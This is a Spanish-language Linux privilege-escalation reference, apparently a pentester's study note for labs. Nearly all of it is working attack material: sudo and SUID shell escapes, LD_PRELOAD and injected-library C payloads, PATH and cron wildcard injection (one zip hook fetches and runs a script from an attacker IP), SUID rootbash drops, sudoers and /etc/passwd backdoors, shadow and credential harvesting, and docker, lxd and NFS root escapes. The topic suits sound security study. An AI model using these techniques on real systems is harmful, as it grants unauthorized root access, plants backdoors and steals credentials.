# 03 — Escalada de privilegios en Linux (referencia profunda)

Tenés shell, sos usuario común, querés root. Esta nota es la **referencia por técnica**: cómo
funciona cada vector, sus variantes y los casos raros.

- Para el **paso a paso ordenado** y la enumeración, usá [`LPE-Linux.md`](lpe/LPE-Linux.md).
- Para los **comandos exactos por binario y contexto**, usá GTFOBins (`vault/indices/Referencias/GTFOBins/`).

> Fuentes: [HackTricks — Linux LPE](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html),
> [HackTricks — Wildcards](https://book.hacktricks.wiki/en/linux-hardening/interesting-files-permissions/wildcards-spare-tricks.html),
> [GTFOBins](https://gtfobins.github.io/).

---

## 0. Shell y orientación

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm; export SHELL=/bin/bash
stty rows 50 cols 200
```

```bash
# Automático (orienta, no decide)
wget http://<TU_IP>:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh -a 2>/dev/null | tee /tmp/lp.out
./pspy64 -pf -i 1000      # cron/procesos en vivo, sin permisos
```

---

## 1. `sudo` — el vector que más rinde

```bash
sudo -l
```

### 1.1 Binario permitido → GTFOBins

```bash
sudo vim -c ':!/bin/sh'
sudo less /etc/hosts            # y dentro:  !/bin/sh
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo env /bin/sh
```

### 1.2 Tabla de configuraciones de sudoers y su ataque

| Lo que muestra `sudo -l` | Ataque |
| --- | --- |
| `env_keep+=LD_PRELOAD` | compilar `.so` y `sudo LD_PRELOAD=./pe.so <cmd>` |
| `env_keep+=LD_LIBRARY_PATH` | `sudo LD_LIBRARY_PATH=/tmp <cmd>` con librería maliciosa |
| `env_keep+=BASH_ENV` (o `ENV`) | `BASH_ENV=/tmp/s.sh sudo <script>` → shell root |
| `env_keep+=PATH` / `secure_path` con dir escribible | hijack de comandos sin ruta absoluta |
| `SETENV:` | `sudo PYTHONPATH=/dev/shm/ <script>` (import hijack) |
| comando **sin ruta** (`ALL=(root) less`) | `export PATH=/tmp:$PATH`; backdoor `less` |
| script Python con `__pycache__` escribible | poisoning de `.pyc` |
| `terraform` + `!env_reset` | `~/.terraformrc` con `dev_overrides` |
| `sudoedit` (sudo < 1.9.12p2) | CVE-2023-22809: `SUDO_EDITOR="vim -- /etc/sudoers" sudoedit /etc/hosts` |

### 1.3 LD_PRELOAD con `env_keep`

```c
// /tmp/pe.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init(void){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
```

```bash
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so <BINARIO_PERMITIDO>
```

`LD_LIBRARY_PATH` análogo: se reemplaza una `.so` que el binario carga.

### 1.4 BASH_ENV con `env_keep`

```bash
cat > /tmp/s.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/s.sh
BASH_ENV=/tmp/s.sh sudo /usr/bin/<script_permitido>
```

### 1.5 `__pycache__` / `.pyc` poisoning

Si un script **con sudo** importa un módulo cuyo `__pycache__` es escribible:

```bash
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
grep -R "^import \|^from " /opt/target/ 2>/dev/null
```

Flujo: correr el script una vez → guardar los primeros 16 bytes del `.pyc` legítimo → compilar
tu payload, `marshal.dumps(...)` → borrar el `.pyc` y reescribir `header + bytecode` → volver a
correr con sudo. CPython valida el header contra la fuente, **no** el cuerpo del bytecode.

### 1.6 Sudo tokens reutilizables

Si el usuario usó `sudo` hace menos de 15 min, `ptrace_scope=0` y hay `gdb`:

```bash
cat /proc/sys/kernel/yama/ptrace_scope     # 0 = ok
git clone https://github.com/nongiach/sudo_inject
bash exploit.sh && /tmp/activate_sudo_token && sudo su
```

### 1.7 sudoers escribible (y ACL oculta)

```bash
ls -l /etc/sudoers /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>              # user:alice:rw-  = backdoor aunque sea 440
echo '<user> ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<user>
visudo -cf /etc/sudoers.d/<user>
```

### 1.8 CVEs de sudo

| CVE | Versión | Ataque |
| --- | --- | --- |
| CVE-2019-14287 | < 1.8.28 | `sudo -u#-1 /bin/bash` |
| CVE-2021-3156 | < 1.9.5p2 | Baron Samedit (`sudoedit -s '\' ...`) |
| CVE-2023-22809 | < 1.9.12p2 | sudoedit argument injection |
| CVE-2025-32463 | 1.9.14–1.9.17 | `sudo --chroot` con `/etc/nsswitch.conf` controlado |
| CVE-2025-32462 | 1.8.8–1.9.17 | spoof de host: `sudo -h <host_permitido> id` |

```bash
sudo -V | head -1
searchsploit sudo
```

### 1.9 DOAS (OpenBSD)

```bash
doas -l 2>/dev/null
# misma idea que sudo: binarios permitidos → GTFOBins
doas vim -c ':!/bin/sh'
```

---

## 2. SUID / SGID — a fondo

```bash
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
```

**Binarios "root instantáneo"**: `find`, `vim`, `nano`, `less`, `more`, `nmap` (viejo), `bash`,
`sh`, `cp`, `mv`, `cpulimit`, `pkexec`, `python`, `perl`, `ruby`, `tar`, `env`.

### 2.1 Analizar un SUID desconocido

```bash
./binario
strings -n 6 ./binario | head -40
ltrace ./binario        # llamadas a librerías
strace ./binario        # llamadas al sistema
```

Buscá `system()`, `execve()`, `setuid()`, rutas relativas o rutas absolutas a otros binarios.

### 2.2 PATH hijacking (comando **sin** ruta absoluta)

```c
system("date");     // vulnerable
```

```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > date && chmod +x date
PATH=/tmp:$PATH /ruta/al/binario_suid
```

### 2.3 Function export (comando **con** ruta absoluta)

Si el SUID llama `/usr/sbin/service`:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp/b && chmod +s /tmp/b && /tmp/b -p; }
export -f /usr/sbin/service
/ruta/al/binario_suid
```

### 2.4 Wrapper SUID que ejecuta un script escribible

```c
system("/bin/bash /usr/local/bin/backup.sh");
```

```bash
find / -perm -4000 -type f 2>/dev/null
strings /ruta/wrapper | grep -E '/bin/bash|\.sh'
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/ruta/wrapper && /var/tmp/rootbash -p
```

### 2.5 `.so` injection (librería que falta)

```bash
strace /ruta/SUID 2>&1 | grep -iE "open|access|no such file"
# open("/path/.config/libcalc.so", O_RDONLY) = -1 ENOENT
```

```c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject(){ system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); }
```

```bash
gcc -shared -o /path/.config/libcalc.so -fPIC libcalc.c
```

### 2.6 RPATH / RUNPATH

```bash
readelf -d /ruta/SUID | grep -E "RPATH|RUNPATH"
ldd /ruta/SUID
# Si apunta a un dir escribible, colocá la .so esperada
```

### 2.7 `ld.so.preload` y linker

```bash
ls -la /etc/ld.so.preload /etc/ld.so.conf.d/ 2>/dev/null
# Si podés escribir en /etc/ld.so.preload → cargás tu .so en procesos que lo lean
```

> **Regla de contexto**: el mismo binario lleva código distinto por `sudo`, `suid`,
> `capabilities` o `file-read`. `find` por sudo: `-exec /bin/sh \; -quit`; por **SUID**:
> `-exec /bin/sh -p \; -quit`. Sin `-p` no conservás privilegios.

---

## 3. Capabilities — a fondo

```bash
getcap -r / 2>/dev/null
cat /proc/self/status | grep Cap
capsh --print 2>/dev/null
```

| Capability | Cómo se explota |
| --- | --- |
| `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` · `perl -e 'POSIX::setuid(0); exec "/bin/bash"'` |
| `cap_setgid+ep` | igual con `setgid(0)` |
| `cap_dac_read_search+ep` | leer cualquier archivo: `tar czf /tmp/s.tgz /etc/shadow && tar xzf …` |
| `cap_dac_override+ep` | escribir archivos arbitrarios (p. ej. `/etc/passwd`) |
| `cap_fowner+ep` | `chown`/`chmod` de archivos ajenos |
| `cap_chown+ep` | cambiar dueño |
| `cap_sys_admin+ep` | montar FS / namespaces |
| `cap_sys_ptrace+ep` | inyectar en proceso root (`gdb`) |
| `cap_sys_module+ep` | cargar módulo del kernel |
| `cap_sys_rawio+ep` | acceso crudo al disco |
| `cap_sys_chroot+ep` | escapar de un chroot |
| `cap_setfcap+ep` | asignar capabilities a binarios |
| `cap_mknod+ep` | crear nodos de dispositivo |
| `cap_net_admin` / `cap_net_raw` | sniffing / manipular red |

```bash
# cap_setuid sobre python
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_dac_read_search sobre tar
tar czf /tmp/shadow.tar.gz /etc/shadow && tar xzf /tmp/shadow.tar.gz -C /tmp
```

> `cap_sys_admin` es prácticamente root: permite `mount`, namespaces y más.

---

## 4. Cron — a fondo

```bash
crontab -l
ls -la /etc/cron* /etc/at* 2>/dev/null
cat /etc/crontab /etc/cron.d/* /etc/cron.{hourly,daily,weekly,monthly}/* 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null
./pspy64 -pf -i 1000
```

### 4.1 PATH del crontab

```bash
# /etc/crontab con  PATH=/home/user:...  y  * * * * * root overwrite.sh
printf 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\n' > /home/user/overwrite.sh
# esperar  →  /tmp/bash -p
```

### 4.2 Wildcard / option injection

Si root ejecuta `tar/rsync/zip/7z *` en un directorio que controlás. **Si el wildcard lleva un
path delante (`/dir/*`) o `./*`, no es vulnerable.**

```bash
# tar (GNU): checkpoint
echo 'echo pwned > /tmp/pwn' > shell.sh; chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# bsdtar / macOS: --use-compress-program
touch -- '--use-compress-program=sh'

# rsync: -e <cmd>
touch -- '-e sh shell.sh'

# 7z: @filelist (exfiltra /etc/shadow aunque uses -- *)
ln -s /etc/shadow root.txt; touch @root.txt
# y root corre:  7za a backup.7z -t7z -snl -- *

# zip: test hook -T / -TT <cmd>  (tokens separados)
touch -- '-T' '-TT wget <TU_IP> -O s.sh; bash s.sh'

# tcpdump: -G/-W/-z  (rotación ejecuta el -z)
```

Otros ganchos: `flock -c <cmd>`, `git -c core.sshCommand=<cmd>`, `scp -S <program>`,
`chown`/`chmod` con `--reference`. Herramienta: [wildpwn](https://github.com/localh0t/wildpwn).

```bash
# Cazar wrappers vulnerables
rg -n --hidden '(tar|rsync|zip|7z|chown|chmod|tcpdump).*(\*|\$@|\$*)' /etc /opt /usr/local /srv 2>/dev/null
```

### 4.3 Script escribible o symlink

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /ruta/script_cron
ln -d -s /ruta/peligrosa /ruta/donde_escribe_cron
```

### 4.4 Tareas frecuentes

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/mp.tmp; sleep 0.1; done
sort /tmp/mp.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort; rm /tmp/mp.tmp
```

### 4.5 Entradas invisibles (CR sin newline)

```bash
cat -A /etc/crontab /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

### 4.6 Expansión aritmética

Si un parser root hace `(( total += count ))` con un campo de log que controlás:

```text
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
```

### 4.7 run-parts y update-motd (grupo `staff`)

```bash
run-parts --test /etc/cron.hourly
# run-parts también ejecuta /etc/update-motd.d en cada login SSH (como root)
cat > /usr/local/bin/run-parts <<'EOF'
#!/bin/bash
chmod 4777 /bin/bash
EOF
chmod +x /usr/local/bin/run-parts
# nuevo login → /bin/bash -p
```

### 4.8 Otros casos

- **Backups root que preservan bits** (`pg_basebackup`, rsync recursivo): plantás un binario SUID
  en el directorio de origen y el backup lo copia como `root:root` con sus bits.
- **Binarios firmados con verificación ingenua**: `objcopy --add-section` para forjar la firma.
- **crontab-ui** corriendo como root: si hay panel web, creás un job que dropea shell SUID.

---

## 5. Servicios y systemd — a fondo

```bash
systemctl list-units --type=service --state=running
systemctl list-timers --all
systemctl show-environment                    # PATH de systemd
systemctl cat <unit>                          # incluye drop-ins
find /etc/systemd/system -writable -type f 2>/dev/null
find /etc/systemd/system -name '*.d' -type d 2>/dev/null
find /lib/systemd /usr/lib/systemd -writable 2>/dev/null
```

### 5.1 Unit `.service` escribible

Editás `ExecStart=/tmp/backdoor` y esperás restart/reboot:

```bash
systemctl daemon-reload && systemctl restart <servicio>
```

### 5.2 Binario de servicio escribible

Reemplazás el ejecutable y reiniciás (o esperás reinicio).

### 5.3 PATH relativo de systemd

```ini
ExecStart=faraday-server         # sin ruta absoluta
```

Si el dir del PATH de systemd es escribible, plantás ese nombre.

### 5.4 Drop-in escribible

`/etc/systemd/system/<unit>.d/*.conf` puede sobreescribir `ExecStart`/`User`.

### 5.5 Timers

Un `.timer` con `Unit=backdoor.service` (o el mismo nombre). Si podés editar el timer o el
servicio que activa, ejecución como root.

### 5.6 Sockets y socket activation

- `.socket` escribible: `ExecStartPre=/home/kali/backdoor` (se ejecuta antes de crear el socket).
- **Socket activation**: un `.socket` con `Accept=no` y `Service=vuln.service` donde el
  `.service` **no existe** y podés escribir en `/etc/systemd/system` → creás el servicio y
  provocás tráfico.

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 5.7 Generators

`/etc/systemd/system-generators` (o `/usr/lib/systemd/system-generators`) escribible → se
ejecutan como root en el arranque.

### 5.8 Servicios root con código propio (patrón clásico de labs)

```bash
ps aux | grep root
ls -la /opt /srv /var/www
find / -writable -type d 2>/dev/null | grep -vE "^/(proc|sys|dev)"
```

**root ejecuta algo que vos podés escribir** → root.

---

## 6. Credenciales olvidadas

```bash
cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.nano_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
grep -riE "passw|secret|token|api[_-]?key" /var/www /opt /etc /home 2>/dev/null \
  | grep -viE "\.js:|\.css:|node_modules" | head -50
find / -name '*.conf' -o -name '*.config' -o -name '*.ini' -o -name '*.env' 2>/dev/null \
  | grep -viE '^/(proc|sys|usr/share)' | head -50
find / -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'authorized_keys' 2>/dev/null
cat /var/lib/mysql/mysql/user.MYD 2>/dev/null ; cat ~/.pgpass ~/.netrc ~/.my.cnf 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
```

- **MySQL**: si podés leer `/var/lib/mysql/`, extraés los hashes a nivel de archivo.
- **PuTTY**, navegadores, gestionadores de contraseñas, tótems de configuración.

---

## 7. Grupos especiales — a fondo

```bash
id
```

| Grupo | Cómo da root |
| --- | --- |
| `sudo` / `admin` / `wheel` | `sudo su` |
| `shadow` | leer `/etc/shadow` → crackear |
| `staff` | write en `/usr/local` + run-parts/update-motd |
| `disk` | acceso crudo al disco |
| `video` | leer el framebuffer |
| `docker` | contenedor con `/` montado |
| `lxd` / `lxc` | contenedor privilegiado |
| `adm` | leer logs |
| `root` | archivos group-writable de root |
| `backup`/`operator`/`lp`/`mail` | credenciales en backups/spools |
| `auth` | (OpenBSD) S/Key, YubiKey |

### disk

```bash
df -h
debugfs /dev/sda1
debugfs:  cd /root ; ls ; cat /root/.ssh/id_rsa ; cat /etc/shadow
# -w para escribir (¡cuidado con FS montado!)
debugfs -w /dev/sda1
debugfs:  write /tmp/backdoor /etc/passwd
```

### video

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
# Abrir screen.raw con GIMP como "Raw image data" y ajustar ancho/alto/formato
```

### staff

`/usr/local/bin` precede en el PATH → reemplazás comandos que root ejecute. Ver §4.7 (run-parts).

### docker

```bash
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt alpine chroot /mnt sh
# Sin CLI, vía API del socket:
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

Receta: [[docker-group]].

### lxd / lxc

```bash
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/sh
```

Receta: [[lxd]].

### root

```bash
find / -group root -perm -g=w 2>/dev/null
```

---

## 8. NFS con `no_root_squash`

Enumeración desde tu Kali:

```bash
showmount -e <IP>
sudo mount -t nfs <IP>:/share /mnt -o nolock
```

Explotación (root en **tu** Kali escribe el SUID en el share):

```c
// shell.c
#include <unistd.h>
int main(void){ setuid(0); setgid(0); system("/bin/bash -p"); }
```

```bash
gcc /mnt/shell.c -o /mnt/shell
sudo chown root:root /mnt/shell && sudo chmod 4755 /mnt/shell
# EN LA VÍCTIMA:  /ruta/al/share/shell
```

Receta: [[nfs-no_root_squash]]. Ver también 111/NFS en `02-enumeracion-servicios.md`.

---

## 9. Archivos escribibles peligrosos

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ /etc/ld.so.preload 2>/dev/null
find / -writable -type f 2>/dev/null | grep -vE "^/(proc|sys|dev|run|tmp)" | head -40
find / -writable -type d 2>/dev/null | grep -vE "^/(proc|sys|dev|run|tmp)" | head -40
```

| Archivo | Ataque |
| --- | --- |
| `/etc/passwd` | agregar usuario root (ver `LPE-Linux` §4.1) |
| `/etc/shadow` | reemplazar el hash de root |
| `/etc/sudoers` / `sudoers.d/*` | añadir regla NOPASSWD (con ACL, ver §1.7) |
| `/etc/ld.so.preload` | cargar `.so` en procesos privilegiados |
| `.git/hooks/pre-commit` | ejecución cuando root hace commit/push |
| `/proc/sys/fs/binfmt_misc/register` | registrar intérprete para un tipo de archivo |
| `~/.config/mimeapps.list` | redirigir `http:`/`https:` a un `.desktop` malicioso |
| `php.ini` de un sandbox root | quitar `disable_functions` |
| `logrotate` config | wildcard/`su` → ejecución con `logrotate` |
| `update-motd.d` | script escribible que corre en login |

### Page-cache-only (Dirty Pipe / Copy Fail)

Algunos bugs no escriben en disco sino en la **copia en page cache**. Si el objetivo es un binario
SUID o algo que root ejecuta, obtenés ejecución antes de que se evacúe la caché, y el hash en
disco queda intacto (efecto temporal hasta reboot).

---

## 10. Kernel modules y `modprobe_path`

```bash
lsmod
modinfo <modulo> 2>/dev/null
dmesg 2>/dev/null | grep -i "signature"
cat /proc/sys/kernel/modules_disabled
sysctl kernel.modprobe 2>/dev/null
find /lib/modules -writable 2>/dev/null
find /etc/modprobe.d -writable 2>/dev/null
```

- **`sudo insmod`** permitido → cargás un módulo malicioso.
- **`kernel.modprobe` / `modprobe_path`** escribible → plantás el helper y lo disparás.
- **`/lib/modules` escribible** (`.ko` o metadatos `modules.*`) → módulo alterado.

---

## 11. D-Bus, SSH agent y shells restringidas

### D-Bus

```bash
busctl list 2>/dev/null
dbus-send --system --print-reply --dest=org.freedesktop.DBus \
          /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null
```

Servicios D-Bus privilegiados con inyección de comandos → root.

### SSH agent forwarding

```bash
echo $SSH_AUTH_SOCK
ssh-add -l
# Si el socket del agente de root es accesible:
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.PID ssh root@localhost
```

### Escapar de una chroot / shell restringida

- **GTFOBins** → binarios con propiedad "Shell".
- **chroot**: si sos root dentro, un segundo `chroot` te deja fuera:

```c
// break_chroot.c
#include <sys/stat.h>
#include <unistd.h>
int main(void){ mkdir("chroot-dir",0755); chroot("chroot-dir");
  for(int i=0;i<1000;i++) chdir(".."); chroot("."); system("/bin/bash"); }
```

- Herramienta: [chw00t](https://github.com/earthquake/chw00t).

---

## 12. Kernel / CVEs (último recurso)

```bash
uname -a; cat /etc/os-release
searchsploit linux kernel $(uname -r | cut -d- -f1)
unshare -Urn true      # ¿namespaces de usuario disponibles? (prerrequisito de muchos exploits)
capsh --print          # ¿qué caps tengo?
```

| CVE | Nombre | Rango |
| --- | --- | --- |
| CVE-2022-0847 | Dirty Pipe | Linux 5.8 → 5.16.11 |
| CVE-2021-4034 | PwnKit (`pkexec`) | casi toda distro de la última década |
| CVE-2016-5195 | DirtyCow | Linux ≤ 3.19 |
| CVE-2024-1086 | netfilter nf_tables UAF | 5.14–6.6 |
| CVE-2024-48990+ | needrestart | análisis de intérpretes |
| CVE-2026-31431 | Copy Fail (`AF_ALG`) | page-cache-only write |

> Verificá los **prerrequisitos reales** (arquitectura, `CONFIG_*`, namespaces, mitigaciones),
> no solo `uname -r`. Y recordá el coste: un exploit de kernel puede **tumbar la máquina**.

---

## Orden de ataque — resumen ejecutivo

```text
1. sudo -l                      ← 30 segundos, alto rendimiento
2. SUID/SGID + GTFOBins         ← rápido, alta tasa de éxito
3. getcap -r /                  ← rápido
4. Credenciales en archivos     ← rápido, frecuente
5. Servicios root escribibles   ← el patrón más común en labs
6. Cron (con pspy)              ← requiere esperar, alto valor
7. Grupos (docker/lxd/disk)     ← instantáneo si estás en el grupo
8. NFS no_root_squash           ← desde tu Kali, muy confiable
9. /etc/passwd o sudoers        ← raro pero trivial
10. Wildcard injection          ← si root usa tar/rsync/zip/7z sobre dir escribible
11. Kernel/CVEs                 ← ÚLTIMO. Puede crashear.
```

---

## Herramientas y referencias

| Herramienta / recurso | Para qué |
| --- | --- |
| [[GTFOBins]] | comandos por binario y contexto |
| [GTFOArgs](https://gtfoargs.github.io/) | abuso solo con argumentos |
| [HackTricks — Linux LPE](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) | referencia exhaustiva |
| [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) | exploits de kernel |
| `linpeas.sh` · `pspy64` · `traitor` · `DeepCe` | enumeración / auto-explotación |
| [`LPE-Linux.md`](lpe/LPE-Linux.md) | paso a paso ordenado |
| [`02-enumeracion-servicios.md`](02-enumeracion-servicios.md) | NFS, SMB, etc. |
